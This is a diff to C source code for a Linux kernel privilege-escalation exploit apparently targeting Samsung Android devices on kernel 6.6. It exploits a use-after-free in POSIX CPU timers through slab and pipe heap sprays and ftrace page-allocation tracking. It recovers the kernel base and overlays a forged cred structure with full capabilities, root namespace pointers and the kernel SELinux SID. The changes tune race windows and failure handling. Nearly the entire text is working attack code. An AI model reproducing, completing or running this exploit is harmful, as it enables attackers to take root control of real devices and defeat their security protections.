@@ -45,7 +45,7 @@
  * link-time symbols) live in offsets.h; only exploit tuning stays here. */
 #include "offsets.h"
 
-/* (selinux_state / panic_on_warn / workqueue-UMH constants: offsets.h) */
+/* (panic_on_warn / workqueue-UMH constants: offsets.h) */
 /* (umh struct layouts + ROOT_UMH_* page slots: offsets.h) */
 /* (DEFEX creds_hash, cred/task field offsets, init_* symbols: offsets.h) */
 
@@ -195,6 +195,30 @@ static void enable_events(void)
     };
     for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
         wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
+}
+
+/*
+ * The reclaim burst only needs page events.  kmem_cache_alloc events from
+ * the spray itself flood the per-CPU buffers and drop mm_page_alloc records
+ * on 6.6, so switch the alloc events off after the victim capture and back
+ * on for the next plant.  Re-registering an existing trigger fails with
+ * EEXIST, hence the remove-first form.
+ */
+static void alloc_events(int on)
+{
+    static const char *names[] = {"kmem_cache_alloc", "kmem_cache_alloc_node"};
+    char command[96];
+
+    for (unsigned i = 0; i < 2; i++)
+    {
+        snprintf(command, sizeof(command), "!enable_event:kmem:%s\n", names[i]);
+        wr(TR "/events/kmem/rss_stat/trigger", command);
+        if (on)
+        {
+            snprintf(command, sizeof(command), "enable_event:kmem:%s\n", names[i]);
+            wr(TR "/events/kmem/rss_stat/trigger", command);
+        }
+    }
 }
 
 static void drain_cpu(int cpu)
@@ -537,7 +561,8 @@ struct base_slot
 
 static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                      const unsigned long long *ptrs, int nrec,
-                                     int *out_slabs, int *out_pfns)
+                                     int *out_slabs, int *out_pfns,
+                                     int *out_votes)
 {
     enum
     {
@@ -616,7 +641,13 @@ static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
         }
     *out_slabs = ns;
     *out_pfns = np;
-    return best_cnt >= 8 ? best_base : 0;
+    if (out_votes)
+        *out_votes = (int)best_cnt;
+    /* The linear map is 2MB aligned; a weak or unaligned winner is a
+     * partial-slab/pfn pairing artifact, not this boot's base. */
+    if (best_cnt < 16 || (best_base & 0x1fffffULL))
+        return 0;
+    return best_base;
 }
 
 static unsigned long long calibrate_base(unsigned char *raw)
@@ -1029,159 +1060,6 @@ static void run_plant(unsigned long long target, int tag, int mode,
                       struct plant_res *res, unsigned char *raw,
                       unsigned long long static_target);
 
-/*
- * Failed-plant zombie: the trigger's timer node is freed while still linked
- * ("stale"), so a reap would run timerqueue_del on reused memory.  Instead of
- * holding the zombie forever, make the reap safe first: posix_cpu_timers_exit
- * walks each queue via its rb_leftmost pointer and skips a queue whose
- * leftmost is NULL (verified in our vmlinux: LDR X20,[X19,#0x7A0]; CBZ).
- * Zero the three leftmost slots in the zombie's task_struct with zero plants,
- * then reap normally -- no zombie remains, so a dying holder can never hand
- * stale nodes to init's reaper.
- *
- * Three zero plants, each retried; if any cannot land the zombie is held
- * (g_held) exactly like before, so the old behaviour is the fallback.
- */
-static int g_repairing;
-
-/* loginuid read-back for the repair probe (world-readable, unlike
- * panic_on_warn which is root-only on Samsung builds). */
-static long read_loginuid(pid_t p)
-{
-    char path[64], buf[32];
-    int fd, n;
-
-    snprintf(path, sizeof(path), "/proc/%d/loginuid", (int)p);
-    fd = open(path, O_RDONLY);
-    if (fd < 0)
-        return -1;
-    n = (int)read(fd, buf, sizeof(buf) - 1);
-    close(fd);
-    if (n <= 0)
-        return -1;
-    buf[n] = 0;
-    return strtol(buf, NULL, 10);
-}
-
-static void repair_zombie(pid_t z, unsigned long long ztask,
-                          unsigned char *raw, int tag)
-{
-    static const unsigned long long slots[3] = {
-        /* queue leftmosts only: the posix_cpu_timers_exit walk reads the
-         * leftmost first and skips the whole queue when it is NULL, so the
-         * queue roots are never dereferenced -- zeroing them would just be
-         * three extra (and failure-prone) plants per zombie. */
-        OFF_TQ_LEFTMOST_0, OFF_TQ_LEFTMOST_1, OFF_TQ_LEFTMOST_2
-    };
-
-    if (!ztask || (ztask & 0x3f) || g_repairing || !g_slide_set)
-    {
-        logf("[-] plant%d zombie %d cannot repair (task=%#llx slide=%d) "
-             "-- held\n",
-             tag, z, ztask, g_slide_set);
-        g_held++;
-        return;
-    }
-    g_repairing = 1;
-    {
-        /*
-         * Round-trip probe first: the repair writes are kernel writes we
-         * cannot read back directly, and a "successful" plant is only a
-         * heuristic.  The zombie's loginuid (task+OFF_TASK_LOGINUID) is
-         * written through the same pipeline and read back through
-         * /proc/<pid>/loginuid, which is world-readable (panic_on_warn is
-         * root-only on Samsung builds and cannot serve as the probe).
-         * Mode 4's value is fully predictable ((V & ~0x1fff) + 0x1000),
-         * so the read-back is a byte-exact check of the pipeline; mode 0
-         * then proves the zero write.  Without a verified probe the
-         * zombie is never reaped: a reap with stale nodes is a guaranteed
-         * kernel panic.
-         */
-        struct plant_res r;
-        int a, ok = 0;
-        long got;
-        unsigned int want = 0;
-
-        for (a = 0; a < 3 && !ok; a++)
-        {
-            memset(&r, 0, sizeof(r));
-            run_plant(ztask + OFF_TASK_LOGINUID, 88, 4, &r, raw, 0);
-            if (r.ok)
-                ok = 1;
-            else if (!r.retry)
-                break;
-        }
-        if (ok)
-            want = (unsigned int)((((r.A - 0x78) & ~0x1fffULL) + 0x1000) &
-                                  0xffffffffULL);
-        got = ok ? read_loginuid(z) : -1;
-        if (!ok || got != (long)want)
-        {
-            g_repairing = 0;
-            logf("[-] plant%d zombie %d probe (nonzero) unverified "
-                 "want=%#x got=%ld -- held\n", tag, z, want, got);
-            g_held++;
-            return;
-        }
-        ok = 0;
-        for (a = 0; a < 3 && !ok; a++)
-        {
-            memset(&r, 0, sizeof(r));
-            run_plant(ztask + OFF_TASK_LOGINUID, 89, 0, &r, raw, 0);
-            if (r.ok)
-                ok = 1;
-            else if (!r.retry)
-                break;
-        }
-        got = ok ? read_loginuid(z) : -1;
-        if (!ok || got != 0)
-        {
-            g_repairing = 0;
-            logf("[-] plant%d zombie %d probe (zero) unverified "
-                 "got=%ld -- held\n", tag, z, got);
-            g_held++;
-            return;
-        }
-    }
-    for (int i = 0; i < 3; i++)
-    {
-        struct plant_res r;
-        int a, ok = 0;
-
-        for (a = 0; a < 3; a++)
-        {
-            memset(&r, 0, sizeof(r));
-            run_plant(ztask + slots[i], 90 + i, 0, &r, raw, 0);
-            if (r.ok)
-            {
-                ok = 1;
-                break;
-            }
-            if (!r.retry)
-                break;
-        }
-        if (!ok)
-        {
-            g_repairing = 0;
-            logf("[-] plant%d zombie %d repair[%d] failed -- held\n",
-                 tag, z, i);
-            g_held++;
-            return;
-        }
-    }
-    g_repairing = 0;
-    kill(z, SIGKILL);
-    {
-        int st = 0;
-
-        if (waitpid(z, &st, 0) == z)
-            logf("[+] plant%d zombie %d repaired+reaped (st=%#x)\n",
-                 tag, z, st);
-        else
-            logf("[!] plant%d zombie %d reap failed\n", tag, z);
-    }
-}
-
 static int stage_write(unsigned long long target, int mode,
                        const char *what, unsigned char *raw,
                        struct plant_res *out, unsigned long long static_target){
@@ -1194,6 +1072,18 @@ static int stage_write(unsigned long long target, int mode,
         memset(&r, 0, sizeof(r));
         logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
              mode == 2 ? "fake" : "zero", attempt);
+        /*
+         * Every plant needs a fresh empty-slab wave: posix_timers_cache only
+         * discards a slab to the buddy allocator when it is fully unused and
+         * node->nr_partial >= min_partial.  Filling and releasing a large
+         * timer batch right before the fork recreates that condition; without
+         * it the second and later plants sit on a partial slab that never
+         * returns to the buddy (observed: first plant 19 ms, next one 60 s
+         * with no hit).
+         */
+        prefill_timers(PREFILL_TIMERS);
+        drain_timers();
+        kick_rss();
         run_plant(target, 1, mode, &r, raw, static_target);
         if (r.ok)
         {
@@ -1214,12 +1104,12 @@ static int stage_write(unsigned long long target, int mode,
 #define SPRAY_THREADS 10
 #define SPRAY_SOCKS 4096
 #define SPRAY_PRE 4000
-/* Phase 2 fires after the parent already sees the victim page free; the
- * catch happens in phase 1's continuous writes (rate, not volume).  A few
- * thousand post writes are plenty of margin -- 20000 just churned 1.6GB of
- * skbs per plant and cost seconds across the chain. */
-#define SPRAY_POST 3000
-#define PIPE_SPRAY_N 128
+/* Phase 2 fires after the parent already sees the victim page free; the catch
+ * happens in phase 1's continuous writes (rate, not volume).  Keep a wide
+ * post-free window: a missed plant parks the holder (only a reboot clears it),
+ * so extra skb churn is much cheaper than losing the race. */
+#define SPRAY_POST 12000
+#define PIPE_SPRAY_N 512
 #define PIPE_PAGES_PER 4
 static _Atomic int g_burst, g_burst2, g_stop_spray;
 static int g_pool[SPRAY_SOCKS][2];  /* zero-mode plants; drained each time */
@@ -1319,6 +1209,30 @@ static int scan_page_alloc_ours(const unsigned char *b, size_t n,
         for (int j = 0; j < SPRAY_THREADS; j++)
             if (pid == atomic_load(&g_spray_tids[j]))
                 return 1;
+    }
+    return 0;
+}
+
+/*
+ * Order-0 pipe fallback: pipe_spray() runs in the parent thread, so its
+ * mm_page_alloc records carry getpid() and order 0.  Accept only the 4 KiB
+ * half that contains V (v_pfn); the other half has no node at our offset.
+ * Without this check a successful pipe capture was reported as a miss and
+ * the process parked.
+ */
+static int scan_page_alloc_pipe(const unsigned char *b, size_t n,
+                                unsigned long long v_pfn)
+{
+    int pid = (int)getpid();
+
+    for (size_t i = 8; i + 12 <= n; i += 4)
+    {
+        if (u64(b, i) != v_pfn || (int)u32(b, i + 8) != 0)
+            continue;
+        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
+            continue;
+        if ((int)u32(b, i - 4) == pid)
+            return 1;
     }
     return 0;
 }
@@ -1490,6 +1404,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
      * Trace from before the fork: copy_process()'s task_struct allocation is
      * what gives the failure path T's task address for the zombie repair.
      */
+    alloc_events(1);
     trace_start();
     pid_t T = fork();
     if (T < 0)
@@ -1580,20 +1495,18 @@ static void run_plant(unsigned long long target, int tag, int mode,
         return;
     }
     {
-        int ns = 0, np = 0;
+        int ns = 0, np = 0, votes = 0;
         unsigned long long base;
 
-        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
-        if (!base)
-            base = g_base;
+        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np, &votes);
         if (!base || base < 0xffffff0000000000ULL ||
             base > 0xffffffc000000000ULL)
         {
             trace_stop();
             kill(T, SIGKILL);
             waitpid(T, NULL, 0);
-            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
-                 tag, base, ns, np, nrec);
+            logf("[-] plant%d bad base=%#llx ns=%d np=%d votes=%d recs=%d\n",
+                 tag, base, ns, np, votes, nrec);
             return;
         }
         g_base = base;
@@ -1607,8 +1520,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
         for (int i = 0; i < nrec; i++)
             if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
                 kept[nkeep++] = ptrs[i];
-        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
-             tag, base, ns, np, nrec, nkeep);
+        logf("[+] plant%d base=%#llx slabs=%d pfns=%d votes=%d recs=%d kept=%d\n",
+             tag, base, ns, np, votes, nrec, nkeep);
     }
     if (nkeep <= VICTIM_IDX)
     {
@@ -1650,26 +1563,32 @@ static void run_plant(unsigned long long target, int tag, int mode,
             /*
              * The posix-cpu-timers exit loop keeps deleting head->next and
              * timerqueue_del() first does head->next = rb_next(node).
-             * rb_next() returns NULL only for an RB_EMPTY_NODE, i.e. when
-             * the parent color equals the node address.  Therefore the
-             * value rb_erase() writes into task->cred (the parent color)
-             * has to be the node address itself, and the fake cred must be
+             * rb_next() returns NULL for an RB_EMPTY_NODE, i.e. when the
+             * parent color equals the node address.  Therefore the value
+             * rb_erase() writes into task->cred (the parent color) has to
+             * be the node address itself, and the fake cred must be
              * overlaid on the stale node.  That takes the
              * WARN_ON_ONCE(RB_EMPTY_NODE) in timerqueue_del; calling it is
              * safe because the fake path pre-zeroes panic_on_warn.
              *
-             * After the erase (6.1 cred layout):
-             *   +0x00 usage|uid = parent color A (uid is dirty)
-             *   +0x08 gid|suid  = target, written by __rb_change_child
-             *   +0x10 sgid|euid = rb_left (target)
-             * uid and euid are repaired by later zero plants; suid/sgid
-             * keep the target value, which is harmless for the exec.
+             * 6.6 cred layout relative to the node (= cred +0x00):
+             *   +0x00 usage    = parent color (node address)
+             *   +0x08 uid/gid  = 0 (memset)
+             *   +0x10 suid/sgid= rb_left (target); repaired by a later plant
+             *   +0x18 euid/egid= 0 (memset)
+             *   +0x20 fsuid/fsgid = 0; the 6.6 cleanup after timerqueue_del
+             *          also does node+0x20 = 0, which lands here harmlessly
+             *   +0x30..+0x50   = full capability sets
+             *   +0x80 security / +0x88 user / +0x90 user_ns /
+             *   +0x98 ucounts / +0xa0 group_info
+             * The fake cred is 0xb8 bytes, so it must not cross the 8 KiB
+             * spray page.
              */
             size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
                                        0x100, 0x0};
             int fit = 0;
 
-            if (off + 0xb0 > 0x2000)
+            if (off + 0xb8 > 0x2000)
             {
                 logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                      tag, off);
@@ -1686,7 +1605,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
 
                 if (b + 0x40 > 0x2000)
                     continue;
-                if (b < off + 0xb0 && off < b + 0x40)
+                if (b < off + 0xb8 && off < b + 0x40)
                     continue;
                 blob = b;
                 fit = 1;
@@ -1707,19 +1626,19 @@ static void run_plant(unsigned long long target, int tag, int mode,
                 build_payload(payload, off, V + 0x78, target);
                 /* The node fields at +0x00 and +0x10 are already set; fill
                  * in the rest of the fake cred around them. */
-                *(unsigned long long *)(pc + 0x28) = FULLCAP; /* inherit */
-                *(unsigned long long *)(pc + 0x30) = FULLCAP; /* permitted */
-                *(unsigned long long *)(pc + 0x38) = FULLCAP; /* effective */
-                *(unsigned long long *)(pc + 0x40) = FULLCAP; /* bset */
-                *(unsigned long long *)(pc + 0x48) = FULLCAP; /* ambient */
-                *(unsigned long long *)(pc + 0x78) = page + blob;
-                *(unsigned long long *)(pc + 0x80) =
-                    ROOT_USER_STATIC + g_slide;
+                *(unsigned long long *)(pc + 0x30) = FULLCAP; /* inherit */
+                *(unsigned long long *)(pc + 0x38) = FULLCAP; /* permitted */
+                *(unsigned long long *)(pc + 0x40) = FULLCAP; /* effective */
+                *(unsigned long long *)(pc + 0x48) = FULLCAP; /* bset */
+                *(unsigned long long *)(pc + 0x50) = FULLCAP; /* ambient */
+                *(unsigned long long *)(pc + 0x80) = page + blob; /* security */
                 *(unsigned long long *)(pc + 0x88) =
-                    INIT_USER_NS_STATIC + g_slide;
+                    ROOT_USER_STATIC + g_slide;
                 *(unsigned long long *)(pc + 0x90) =
-                    INIT_UCOUNTS_STATIC + g_slide;
+                    INIT_USER_NS_STATIC + g_slide;
                 *(unsigned long long *)(pc + 0x98) =
+                    INIT_UCOUNTS_STATIC + g_slide;
+                *(unsigned long long *)(pc + 0xa0) =
                     INIT_GROUPS_STATIC + g_slide;
                 *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
                     SELINUX_SID_KERNEL;                    /* osid */
@@ -1756,6 +1675,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
              nrec, slab_own, g_base);
     }
 
+    /* V is captured; stop the alloc records flooding the burst window. */
+    alloc_events(0);
     atomic_store(&g_burst, 0);
     atomic_store(&g_burst2, 0);
     atomic_store(&g_stop_spray, 0);
@@ -1791,45 +1712,22 @@ static void run_plant(unsigned long long target, int tag, int mode,
     if (wait_zombie(T, &si))
     {
         /*
-         * The trigger never exited, so the exec/kill chain stalled and
-         * timer-go was already written.  If the exec thread (etid) still
-         * exists, de_thread() has not run: exec has not reached
-         * posix_cpu_timers_exit(), the timers are still live and a normal
-         * kill/reap will dequeue them through siglock, without touching a
-         * stale node.  That makes the retry safe.
+         * The trigger never became a zombie.  On 6.6 a reap after a stalled
+         * exec can run posix_cpu_timers_exit() on a stale node; repairing it
+         * with more UAF plants was not reliable on this kernel (a failed
+         * repair panicked the device).  Hold the process instead: a parked
+         * holder is recoverable with a reboot, a bad reap is not.
          */
-        int exec_tid_alive = etid &&
-                             syscall(SYS_tgkill, T, etid, 0) == 0;
-
         atomic_store(&g_stop_spray, 1);
         atomic_store(&g_burst2, 1);
         for (int i = 0; i < SPRAY_THREADS; i++)
             pthread_join(th[i], NULL);
         drain_spray(mode == 2);
         trace_stop();
-        if (exec_tid_alive)
-        {
-            /*
-             * Kill the stalled trigger to stop its helpers.  The node may
-             * be stale if the exec teardown raced, so the reap is made safe
-             * first (repair_zombie empties the timer queues), then the
-             * trigger is reaped and no zombie is left behind.
-             */
-            kill(T, SIGKILL);
-            logf("[-] plant%d no zombie (code=%d status=%d, etid=%d "
-                 "still alive); killed, repairing+reaping\n",
-                 tag, si.si_code, si.si_status, etid);
-            repair_zombie(T, T_task, raw, tag);
-            res->retry = 1;
-            return;
-        }
-        logf("[-] plant%d no zombie (code=%d status=%d); repairing+reaping\n",
-             tag, si.si_code, si.si_status);
-        /* Kill first so no live timer can re-arm a queue leftmost while the
-         * repair writes run; cleanup only happens at reap on this kernel. */
-        kill(T, SIGKILL);
-        repair_zombie(T, T_task, raw, tag);
-        return;
+        logf("[-] plant%d no zombie (code=%d status=%d etid=%d); parking\n",
+             tag, si.si_code, si.si_status, etid);
+        g_held++;
+        park_forever("trigger did not become a zombie");
     }
     logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
          tag, T, etid, si.si_code, si.si_status);
@@ -1853,10 +1751,10 @@ static void run_plant(unsigned long long target, int tag, int mode,
             free(payload);
             return;
         }
-        logf("[-] plant%d reap code=%d status=%d not SIGKILL; repairing+reaping\n",
+        logf("[-] plant%d reap code=%d status=%d not SIGKILL; parking\n",
              tag, si.si_code, si.si_status);
-        repair_zombie(T, T_task, raw, tag);
-        return;
+        g_held++;
+        park_forever("trigger did not die from SIGKILL");
     }
     /*
      * Order-1 reclaim only: android.hardwar consumes order-0 pages as soon as
@@ -1867,9 +1765,16 @@ static void run_plant(unsigned long long target, int tag, int mode,
      */
     atomic_store(&g_burst, 1);
     long t1 = now_ms();
-    int hit = 0;
+    /*
+     * A 15 s window is too tight on this device: the victim slab sometimes
+     * reaches the buddy at 15.0 s, so phase 2 never gets a chance.  The
+     * larger fixed window keeps the order-1/pipe spray running long enough
+     * after the free; a real hit still returns in milliseconds.
+     */
+    long deadline = t1 + 45000;
+    int hit = 0, pipe_hit = 0;
 
-    while (!hit && now_ms() - t1 < 15000)
+    while (!hit && now_ms() < deadline)
     {
         for (int cpu = 0; cpu < TRACE_CPUS && !hit; cpu++)
         {
@@ -1881,6 +1786,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
             {
                 hit = 1;
                 dump_victim_trace(slab_pfn);
+            }
+            else if (mode != 2 && free_seen &&
+                     scan_page_alloc_pipe(raw, (size_t)m, pfn))
+            {
+                hit = 1;
+                pipe_hit = 1;
+                dump_victim_trace(pfn);
             }
             else if (!free_seen &&
                      scan_page_free(raw, (size_t)m, slab_pfn))
@@ -1895,11 +1807,60 @@ static void run_plant(unsigned long long target, int tag, int mode,
                  */
                 if (mode != 2)
                     pipe_spray((unsigned)((V + 0x78) & 0xfff), target);
+                /*
+                 * Keep at least a few seconds after the free even when it
+                 * lands near the end of the (now 30 s) capture window.
+                 */
+                if (deadline < now_ms() + 8000)
+                    deadline = now_ms() + 8000;
                 atomic_store(&g_burst2, 1);
             }
         }
         if (!hit)
             usleep(50);
+    }
+    /*
+     * The slab can reach the buddy at the very end of the main window
+     * (uid_gid in the field landed exactly on the 30 s edge).  Run a separate
+     * post-free slice: it also catches a free event that arrived after the
+     * main loop's last read, and gives phase 2 time to claim the page.
+     */
+    if (!hit)
+    {
+        long post = now_ms() + 15000;
+
+        while (!hit && now_ms() < post)
+        {
+            for (int cpu = 0; cpu < TRACE_CPUS && !hit; cpu++)
+            {
+                long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
+
+                if (m <= 0)
+                    continue;
+                if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
+                {
+                    hit = 1;
+                    dump_victim_trace(slab_pfn);
+                }
+                else if (mode != 2 && free_seen &&
+                         scan_page_alloc_pipe(raw, (size_t)m, pfn))
+                {
+                    hit = 1;
+                    pipe_hit = 1;
+                    dump_victim_trace(pfn);
+                }
+                else if (!free_seen &&
+                         scan_page_free(raw, (size_t)m, slab_pfn))
+                {
+                    free_seen = 1;
+                    if (mode != 2)
+                        pipe_spray((unsigned)((V + 0x78) & 0xfff), target);
+                    atomic_store(&g_burst2, 1);
+                }
+            }
+            if (!hit)
+                usleep(50);
+        }
     }
     atomic_store(&g_stop_spray, 1);
     atomic_store(&g_burst2, 1);
@@ -1915,28 +1876,32 @@ static void run_plant(unsigned long long target, int tag, int mode,
     {
         long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
 
-        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
+        if (m <= 0)
+            continue;
+        if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
             hit = 1;
+        else if (mode != 2 && free_seen &&
+                 scan_page_alloc_pipe(raw, (size_t)m, pfn))
+        {
+            hit = 1;
+            pipe_hit = 1;
+        }
     }
-    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
-         tag, free_seen, hit, now_ms() - t1);
+    logf("[+] plant%d free_seen=%d pipe_hit=%d burst hit=%d after %ldms\n",
+         tag, free_seen, pipe_hit, hit, now_ms() - t1);
     dump_victim_trace(slab_pfn);
     if (!hit)
     {
         /*
-         * The victim slab can stay in SLUB's partial list instead of
-         * returning to the buddy allocator, so the spray never sees its
-         * pfn.  Keep the zombie (the stale node is not erased while it is
-         * unreaped) and let stage_write pick a new victim.
+         * The victim slab can stay in SLUB's partial list or be taken by a
+         * system allocation.  The stale node is still linked, so a reap
+         * would make the kernel run timerqueue_del() on memory we do not
+         * own.  Park without reaping; the zombie (and its helpers) are
+         * cleared by the reboot the caller is told to perform.
          */
-        logf("[-] plant%d burst missed; repairing+reaping; retryable\n", tag);
-        /* No erase will use this payload (the stale node is not the one the
-         * repair touches), so reclaim the spray memory before the repair's
-         * own plants run against empty pools. */
-        drain_spray(mode == 2);
-        repair_zombie(T, T_task, raw, tag);
-        res->retry = 1;
-        return;
+        logf("[-] plant%d burst missed; parking (stale node held)\n", tag);
+        g_held++;
+        park_forever("burst miss");
     }
 
     usleep(1000);
